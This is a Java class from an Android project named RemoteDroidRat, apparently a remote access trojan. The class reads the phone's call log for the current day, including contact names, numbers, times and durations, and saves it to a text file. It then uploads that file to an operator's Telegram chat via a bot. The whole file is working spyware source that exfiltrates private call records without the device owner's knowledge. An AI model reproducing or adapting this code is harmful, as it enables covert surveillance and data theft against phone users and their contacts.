package com.KaranKumar.RemoteDroidRat.commandActions;

import android.content.Context;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.provider.CallLog;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;

import com.KaranKumar.RemoteDroidRat.telegramBot.TelegramBotApi;
import com.KaranKumar.RemoteDroidRat.adminInfo;

public class getCallLog {
    Context context;
    TelegramBotApi telegramBot;
    adminInfo admin;

    public getCallLog(Context context) {
        if (context != null) {
            this.context = context;
            this.telegramBot = new TelegramBotApi(context);
            this.admin = new adminInfo(context);
            // Handle other initialization tasks if needed.
        } else {
            // Handle the case where context is null, log an error, or throw an exception.
        }
    }

    public void fetchAndSaveCallLogs() {
        try {
            // Fetch call logs for today
            String selection = CallLog.Calls.DATE + " >= ?";
            String[] selectionArgs = {String.valueOf(getTodayMidnight())};

            Cursor cursor = context.getContentResolver().query(
				CallLog.Calls.CONTENT_URI,
				null,
				selection,
				selectionArgs,
				null
            );

            if (cursor != null && cursor.getCount() > 0) {
                while (cursor.moveToNext()) {
                    String callerName = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
                    String callerNumber = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    String callDate = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE));
                    String callDuration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));

                    // Convert timestamp to date and time
                    String formattedDate = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(Long.parseLong(callDate)));

                    // Save to text file
                    saveCallLogToFile(callerName, callerNumber, formattedDate, callDuration);
                }
                cursor.close();
            }

            // Send to Telegram Bot
            sendToTelegramBot(admin.getChatId(), context.getFilesDir() + File.separator + "call_logs.txt");
        }  catch (NumberFormatException numberFormatException) {
            numberFormatException.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void saveCallLogToFile(String callerName, String callerNumber, String callDate, String callDuration) {
        try {
            FileWriter fileWriter = new FileWriter(context.getFilesDir() + File.separator + "call_logs.txt", true);
            fileWriter.append("Name: " + callerName + ", Number: " + callerNumber +
							  ", Date: " + callDate + ", Duration: " + callDuration + " seconds\n");
            fileWriter.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void sendToTelegramBot(String chatId, String file) {
        if (isNetworkConnected()) {
            telegramBot.sendFile(chatId, file);
        }
    }

    private boolean isNetworkConnected() {
        ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo mobileNetworkInfo = connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
        return mobileNetworkInfo != null && mobileNetworkInfo.isConnected();
    }

    private long getTodayMidnight() {
        long currentTime = System.currentTimeMillis();
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd");
        try {
            Date date = sdf.parse(sdf.format(currentTime));
            return date.getTime();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return currentTime;
    }
}
